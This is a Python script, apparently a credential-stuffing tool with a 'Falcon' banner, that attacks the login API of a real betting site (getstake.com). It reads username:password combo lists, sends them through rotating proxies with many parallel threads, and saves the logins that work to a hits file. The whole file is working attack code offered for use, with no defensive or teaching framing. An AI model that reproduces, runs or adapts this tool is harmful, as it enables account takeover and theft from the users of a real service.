
import requests
from concurrent.futures import ThreadPoolExecutor
import random
import time

class Color:
    no_colored = "\033[0m"
    white_bold = "\033[1;37m"
    blue_bold = "\033[1;96m"
    green_bold = "\033[1;92m"
    red_bold = "\033[1;91m"
    yellow_bold = "\033[1;33m"
clear_screen = "\033c"   
content = f"""{Color.red_bold}
  /$$$$$$          /$$                               /$$$$$$$$  /$$     /$$    /$$$$$$    /$$  
 /$$__  $$        | $$                              |_____ $$//$$$$   /$$$$   /$$__  $$ /$$$$  
| $$  \__//$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$      /$$/|_  $$  |_  $$  | $$  \ $$|_  $$  
| $$$$   |____  $$| $$ /$$_____/ /$$__  $$| $$__  $$    /$$/   | $$    | $$  |  $$$$$$/  | $$  
| $$_/    /$$$$$$$| $$| $$      | $$  \ $$| $$  \ $$   /$$/    | $$    | $$   >$$__  $$  | $$  
| $$     /$$__  $$| $$| $$      | $$  | $$| $$  | $$  /$$/     | $$    | $$  | $$  \ $$  | $$  
| $$    |  $$$$$$$| $$|  $$$$$$$|  $$$$$$/| $$  | $$ /$$/     /$$$$$$ /$$$$$$|  $$$$$$/ /$$$$$$
|__/     \_______/|__/ \_______/ \______/ |__/  |__/|__/     |______/|______/ \______/ |______/
                                                                                                   
{Color.no_colored}"""
print(clear_screen)
print(content)
time.sleep(3)
proxy = set()
with open("proxies.txt","r", encoding='utf-8') as pfile:
    lines = pfile.readlines()
    for line in lines:
        proxy.add(line.strip())

combo_count = 0

def counthits():
    with open("Hits.txt","r", encoding='utf-8') as file:
        succ_hits = len(file.readlines())
        return succ_hits

def update_log_file():
    global combo_count  
    with open("logs.txt", 'w', encoding='utf-8') as log_file:
        log_file.write(f"Combos Checked: {combo_count}\n")
        log_file.write(f"Hits: {counthits()}\n")
        log_file.write(f"Fails: {(combo_count)-counthits()}\n")

def brutter(user, password, proxies):
    global combo_count 
    url = "https://getstake.com/api/v1/auth/login"
    payload = {
        "username": user,
        "password": password
    }

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    response = requests.post(url, json=payload, headers=headers, proxies=proxies)
    combo_count=combo_count+1
    update_log_file()

    if response.status_code == 200:
        
        with open("Hits.txt", 'a', encoding='utf-8') as hits:
            hits.write(f"{user}:{password}")
            hits.write("\n")

        print(f"{Color.yellow_bold}{response.status_code}{Color.no_colored} {Color.green_bold}{user}:{password}{Color.no_colored}")
    
    else:
        
        print(f"{Color.red_bold}{response.status_code}{Color.no_colored} {Color.blue_bold}{user}:{password}{Color.no_colored}") 

def process_combo(combo):
    proxies = {
        'http': 'http://' + random.choice(list(proxy))
    }
    parts = combo.strip().split(":")
    try:
        if len(parts) == 2:
            user = parts[0]
            password = parts[1]
            brutter(user, password, proxies)
        else:
            pass
    except requests.exceptions.RequestException as e:
        pass

if __name__ == "__main__":
    with open("combos.txt", 'r', encoding='utf-8') as combo:
        lines = combo.readlines()

    num_threads = int(input("Enter no. of Threads : "))

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for line in lines:
            executor.submit(process_combo, line)
